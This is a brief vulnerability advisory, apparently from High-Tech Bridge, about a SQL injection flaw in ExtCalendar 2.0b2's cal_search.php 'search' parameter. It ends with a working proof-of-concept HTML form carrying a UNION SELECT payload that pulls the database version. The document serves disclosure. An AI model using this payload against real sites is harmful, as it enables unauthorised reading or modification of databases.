@@ -1,0 +1,19 @@
+Vulnerability ID: HTB22986
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_extcalendar_2.html
+Product: ExtCalendar 2
+Vendor: http://sourceforge.net/projects/extcal/ 
+Vulnerable Version: 2.0b2
+Vendor Notification: 05 May 2011 
+Vulnerability Type: SQL Injection
+Risk level: Medium 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "cal_search.php" script to properly sanitize user-supplied input in "search" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+
+<form action="http://[host]/cal_search.php" method="post" enctype="multipart/form-data">
+<input type="hidden" name="search" value="') union select 1,version(),3,4,5,6,7,8,9,10 -- "> 
+<input type="submit" value="OK">
+
